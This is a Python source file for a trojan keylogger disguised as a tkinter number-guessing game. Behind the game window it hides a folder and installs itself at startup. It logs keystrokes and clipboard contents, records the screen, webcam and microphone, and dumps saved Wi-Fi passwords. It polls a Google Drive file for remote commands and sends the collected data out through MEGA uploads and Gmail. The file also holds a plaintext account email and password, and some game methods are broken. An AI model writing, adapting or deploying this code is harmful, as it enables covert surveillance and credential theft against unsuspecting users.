import pynput.keyboard
import pyperclip
import threading
import time
import cv2
import numpy as np
import pyautogui
import requests
import pyaudio
import wave
import os
import subprocess
import socket
import smtplib
import ssl
import platform
import psutil
import json
import sys
import shutil
import tkinter as tk
import random
from tkinter import ttk, messagebox
from mega import Mega
from email.message import EmailMessage
from datetime import datetime

if sys.platform == "win32":
    HIDDEN_FOLDER = os.path.join(os.getenv('APPDATA'), 'SystemLogs')

if not os.path.exists(HIDDEN_FOLDER):
    os.makedirs(HIDDEN_FOLDER)
    if sys.platform == "win32":
        os.system(f"attrib +h {HIDDEN_FOLDER}")

KEYSTROKE_LOG = os.path.join(HIDDEN_FOLDER, "keystrokes.txt")
CLIPBOARD_LOG = os.path.join(HIDDEN_FOLDER, "clipboard.txt")
SCREEN_RECORD_FILE = os.path.join(HIDDEN_FOLDER, "screen_record.avi")
CAMERA_RECORD_FILE = os.path.join(HIDDEN_FOLDER, "front_camera.avi")
AUDIO_RECORD_FILE = os.path.join(HIDDEN_FOLDER, "audio_record.wav")
WIFI_CREDENTIALS_FILE = os.path.join(HIDDEN_FOLDER, "wifi_credentials.txt")
SYSTEM_INFO_FILE = os.path.join(HIDDEN_FOLDER, "system_info.txt")

EMAIL_SENDER = "k214790@nu.edu.pk"
EMAIL_PASS = ""
EMAIL_RECEIVER = "k214790@nu.edu.pk"
MEGA_EMAIL = "k214790@nu.edu.pk"
MEGA_PASS = "sohaibali123"
COMMAND_FILE_URL = "https://drive.google.com/file/d/1vsBbsUPbwcHmVA8qGWnM8T3Y2sxH7sRa/view?usp=drive_link"

SCREEN_SIZE = pyautogui.size()
FPS = 15
fourcc = cv2.VideoWriter_fourcc(*"XVID")
video_writer = cv2.VideoWriter(SCREEN_RECORD_FILE, fourcc, FPS, SCREEN_SIZE)

stop_flag = False
camera_active = False
audio_active = False
camera_writer = None

def send_startup_email():
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "System Notification"
        body = f"Keylogger started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        msg.set_content(body)
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASS)
            server.send_message(msg)
    except: pass

def add_to_startup():
    global STARTUP_FLAG
    try:
        if sys.platform == "win32":
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            exe_path = sys.argv[0]
            
            if not os.path.exists(os.path.join(startup_path, os.path.basename(exe_path))):
                shutil.copy(exe_path, startup_path)
                STARTUP_FLAG = True
            
    except Exception as e:
        print(f"Startup error: {e}")

# Add game GUI
class NumberGuessingGame:
    def __init__(self, root):
        self.root = root
        self.root.title("Number Guessing Game")
        self.root.geometry("400x300")
        
        self.target_number = random.randint(1, 1000)
        self.attempts_left = 10
        self.game_active = True

        # GUI Elements
        self.header = tk.Label(root, text="Guess the Number (1-1000)", font=("Arial", 14))
        self.header.pack(pady=10)
        
        self.binary_hint = tk.Label(root, text="Hint: Use binary search strategy!", fg="blue")
        self.binary_hint.pack()
        
        self.entry = tk.Entry(root, font=("Arial", 12))
        self.entry.pack(pady=10)
        self.entry.bind("<Return>", self.check_guess)
        
        self.submit_btn = tk.Button(root, text="Submit Guess", command=self.check_guess)
        self.submit_btn.pack(pady=5)
        
        self.attempts_label = tk.Label(root, text=f"Attempts left: {self.attempts_left}", font=("Arial", 10))
        self.attempts_label.pack()
        
        self.feedback = tk.Label(root, text="", fg="red")
        self.feedback.pack(pady=10)

    def check_guess(self, event=None):
        if not self.game_active:
            return

        try:
            guess = int(self.entry.get())
            self.entry.delete(0, tk.END)
            
            if guess == self.target_number:
                messagebox.showinfo("Congratulations!", "You guessed correctly!")
                self.game_active = False
                self.root.destroy()
                return
                
            self.attempts_left -= 1
            hint = "Try higher!" if guess < self.target_number else "Try lower!"
            
            if self.attempts_left <= 0:
                messagebox.showinfo("Game Over", 
                    f"Out of attempts! Number was {self.target_number}")
                self.root.destroy()
                return
                
            self.attempts_label.config(text=f"Attempts left: {self.attempts_left}")
            self.feedback.config(text=hint)

        except ValueError:
            self.feedback.config(text="Please enter a valid number!")
                
        except ValueError:
            self.status_label.config(text="Please enter a valid number!")
    
    def end_game(self):
        self.guess_btn.config(state=tk.DISABLED)
        self.restart_btn.pack(pady=5)
        self.quit_btn.pack(pady=5)
        self.entry.config(state=tk.DISABLED)
    
    def restart_game(self):
        self.root.destroy()
        NumberGame().root.mainloop()
    
    def on_close(self):
        if messagebox.askyesno("Quit", "Are you sure you want to exit?"):
            self.root.destroy()

def delete_all_files():
    global video_writer, camera_writer
    files_to_delete = [
        KEYSTROKE_LOG, CLIPBOARD_LOG, SCREEN_RECORD_FILE,
        CAMERA_RECORD_FILE, AUDIO_RECORD_FILE,
        WIFI_CREDENTIALS_FILE, SYSTEM_INFO_FILE
    ]
    
    if video_writer is not None:
        video_writer.release()
    if camera_writer is not None:
        camera_writer.release()

    for file in files_to_delete:
        try:
            if os.path.exists(file):
                os.remove(file)
        except: pass

def upload_to_mega():
    try:
        mega = Mega().login(MEGA_EMAIL, MEGA_PASS)
        uploaded_files = {}
        files_to_upload = [SCREEN_RECORD_FILE, CAMERA_RECORD_FILE, AUDIO_RECORD_FILE]

        for file in files_to_upload:
            if os.path.exists(file):
                uploaded_file = mega.upload(file)
                link = mega.get_upload_link(uploaded_file)
                uploaded_files[file] = link
        return uploaded_files
    except: return {}

def send_email(uploaded_files):
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "Logging Data"
        body = "Uploaded Files:\n"
        
        for file, link in uploaded_files.items():
            body += f"{file}: {link}\n"
        msg.set_content(body)

        log_files = [KEYSTROKE_LOG, CLIPBOARD_LOG, WIFI_CREDENTIALS_FILE, SYSTEM_INFO_FILE]
        for log in log_files:
            if os.path.exists(log):
                with open(log, "r", encoding="utf-8") as f:
                    msg.add_attachment(f.read().encode("utf-8"), maintype="text", subtype="plain", filename=log)

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASS)
            server.send_message(msg)
    except: pass

def stop_all():
    global stop_flag
    stop_flag = True
    if os.path.exists(SCREEN_RECORD_FILE):
        cv2.destroyAllWindows()
    if camera_writer:
        camera_writer.release()
    send_email(upload_to_mega())
    delete_all_files()

def fetch_wifi_credentials():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess_kwargs = {'startupinfo': startupinfo, 'capture_output': True, 'text': True}

        result = subprocess.run(["netsh", "wlan", "show", "profiles"], **subprocess_kwargs)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]

        wifi_data = []
        for profile in profiles:
            result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], **subprocess_kwargs)
            if result.returncode == 0:
                password = next((line.split(":")[1].strip() for line in result.stdout.split("\n") if "Key Content" in line), "")
                if password: wifi_data.append(f"SSID: {profile}, Password: {password}")

        with open(WIFI_CREDENTIALS_FILE, "w") as f:
            f.write("\n".join(wifi_data)) if wifi_data else f.write("No credentials found")
    except: open(WIFI_CREDENTIALS_FILE, "a").close()

def fetch_system_info():
    # Fetching system information
    system_info = {
        "Processor": platform.processor(),
        "System": platform.system(),
        "Platform Version": platform.version(),
        "Architecture": platform.machine(),
        "Hostname": socket.gethostname(),
        "Main IP Address": socket.gethostbyname(socket.gethostname()),
        "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True)
    }

    # Try to fetch the public IP address
    try:
        public_ip = requests.get('https://api.ipify.org').text
        system_info["Public IP Address"] = public_ip
    except requests.RequestException:
        system_info["Public IP Address"] = "Unavailable"

    # Disk information
    disks = psutil.disk_partitions()
    disk_info = ""
    valid_disk_count = 0
    
    for disk in disks:
        try:
            if 'cdrom' in disk.opts or 'remote' in disk.opts:
                continue
                
            usage = psutil.disk_usage(disk.mountpoint)
            valid_disk_count += 1
            
            disk_info += f"\nDrive {valid_disk_count} ({disk.device}):\n"
            disk_info += f"Mount Point: {disk.mountpoint}\n"
            disk_info += f"Filesystem: {disk.fstype}\n"
            disk_info += f"Total Space: {usage.total / (1024**3):.2f} GB\n"
            disk_info += f"Used Space: {usage.used / (1024**3):.2f} GB\n"
            disk_info += f"Free Space: {usage.free / (1024**3):.2f} GB\n"
            disk_info += f"Usage Percentage: {usage.percent}%\n"
            
        except Exception as e:
            disk_info += f"\nDrive Error ({disk.device}): {str(e)}\n"
            continue

    # User information
    users = psutil.users()
    user_info = ""
    for user in users:
        user_info += f"User: {user.name}, Terminal: {user.terminal}, Host: {user.host}, " \
                     f"Started: {datetime.fromtimestamp(user.started).strftime('%Y-%m-%d %H:%M:%S')}\n"

    # Writing system information to file
    with open(SYSTEM_INFO_FILE, 'w') as file:
        for key, value in system_info.items():
            file.write(f"{key}: {value}\n")
        file.write("\nDisk Information:\n")
        file.write(disk_info)
        file.write("\nUser Information:\n")
        file.write(user_info)

def log_keystroke(key):
    global stop_flag
    if stop_flag:
        return

    try:
        # Numpad mapping (Windows VK codes)
        numpad_map = {
            96: '0', 97: '1', 98: '2', 99: '3',
            100: '4', 101: '5', 102: '6',
            103: '7', 104: '8', 105: '9',
            110: '.',  # Numpad decimal
        }

        # Control character mapping
        control_chars = {
            1: 'A', 2: 'B', 3: 'C', 4: 'D', 5: 'E',
            6: 'F', 7: 'G', 8: 'H', 9: 'I', 10: 'J',
            11: 'K', 12: 'L', 13: 'M', 14: 'N', 15: 'O',
            16: 'P', 17: 'Q', 18: 'R', 19: 'S', 20: 'T',
            21: 'U', 22: 'V', 23: 'W', 24: 'X', 25: 'Y',
            26: 'Z', 27: '[ESC]', 28: '\\', 29: ']',
            30: '^', 31: '_'
        }

        # Handle numpad keys
        if hasattr(key, 'vk') and key.vk in numpad_map:
            char = numpad_map[key.vk]
        # Handle control characters
        elif hasattr(key, 'char') and key.char and ord(key.char) < 32:
            code = ord(key.char)
            char = f"[CTRL+{control_chars.get(code, hex(code))}]"
        # Handle special keys
        else:
            replacements = {
                'space': ' ',
                'enter': '\n',
                'backspace': '[BACKSPACE]',
                'tab': '[TAB]',
                'shift': '[SHIFT]',
                'shift_r': '[SHIFT]',
                'ctrl_l': '[CTRL]',
                'ctrl_r': '[CTRL]',
                'alt_l': '[ALT]',
                'alt_r': '[ALT]',
                'cmd': '[WIN]',
                'caps_lock': '[CAPSLOCK]',
                'esc': '[ESC]'
            }
            key_str = str(key).replace("Key.", "")
            char = replacements.get(key_str.lower(), f"[{key_str.upper()}]")

        # Write to log file
        with open(KEYSTROKE_LOG, "a", encoding="utf-8") as file:
            file.write(char)

    except Exception as e:
        print(f"Key logging error: {e}")

def log_clipboard():
    last_clipboard = ""
    while not stop_flag:
        current = None
        try:
            current = pyperclip.paste()
        except:
            pass 

        if current is not None and current != last_clipboard:
            last_clipboard = current
            with open(CLIPBOARD_LOG, "a") as f:
                f.write(f"{time.ctime()} - {current}\n")

        time.sleep(5) 

def record_screen():
    global stop_flag, video_writer
    stop_flag = False
    
    if video_writer is None or not video_writer.isOpened():
        video_writer = cv2.VideoWriter(SCREEN_RECORD_FILE, fourcc, FPS, SCREEN_SIZE)

    while not stop_flag:
        try:
            frame = cv2.cvtColor(np.array(pyautogui.screenshot()), cv2.COLOR_RGB2BGR)
            video_writer.write(frame)
            time.sleep(1/FPS)
        except: pass
    video_writer.release()

def record_front_camera():
    global stop_flag, camera_active, camera_writer
    if camera_active: return

    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return
    
    width = int(cap.get(3))
    height = int(cap.get(4))
    camera_writer = cv2.VideoWriter(CAMERA_RECORD_FILE, fourcc, FPS, (width, height))

    camera_active = True
    while not stop_flag and camera_active:
        ret, frame = cap.read()
        if ret: camera_writer.write(frame)
    cap.release()
    if camera_writer: camera_writer.release()
    camera_active = False

def record_audio():
    global stop_flag, audio_active
    if audio_active: return
    
    audio_active = True
    CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 2, 44100
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []

    while not stop_flag and audio_active:
        frames.append(stream.read(CHUNK))

    stream.stop_stream()
    stream.close()
    audio.terminate()

    with wave.open(AUDIO_RECORD_FILE, "wb") as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b"".join(frames))
    audio_active = False

def lock_screen():
    system = platform.system()
    if system == "Windows":
        subprocess.call("rundll32.exe user32.dll,LockWorkStation")

def check_commands():
    global stop_flag, camera_active, audio_active
    while True:
        try:
            response = requests.get(COMMAND_FILE_URL)
            if response.status_code == 200:
                command = response.text.strip().lower()

                if "stop_code" in command:
                    stop_all()
                    os._exit(0)
                elif "stop" in command:
                    stop_flag = True
                    time.sleep(1)
                    send_email(upload_to_mega())
                    delete_all_files()
                elif "start_front_camera" in command and not camera_active:
                    threading.Thread(target=record_front_camera, daemon=True).start()
                elif "start_audio_recording" in command and not audio_active:
                    threading.Thread(target=record_audio, daemon=True).start()
                elif "start" in command:
                    stop_flag = False
                    threading.Thread(target=log_clipboard, daemon=True).start()
                    threading.Thread(target=record_screen, daemon=True).start()
                elif "lock_screen" in command:
                    lock_screen()
        except: pass
        time.sleep(5)

if __name__ == "__main__":
    # Initialize keylogger components
    add_to_startup()
    send_startup_email()
    
    # Start all background services as non-daemon threads
    def start_background_services():
        clipboard_thread = threading.Thread(target=log_clipboard, daemon=False)
        clipboard_thread.start()
        screen_thread = threading.Thread(target=record_screen, daemon=False)
        screen_thread.start()
        fetch_wifi_credentials()
        fetch_system_info()
        command_thread = threading.Thread(target=check_commands, daemon=False)
        command_thread.start()

        with pynput.keyboard.Listener(on_press=log_keystroke) as listener:
            listener.join()

    bg_thread = threading.Thread(target=start_background_services, daemon=False)
    bg_thread.start()

    root = tk.Tk()
    game = NumberGuessingGame(root)
    root.mainloop()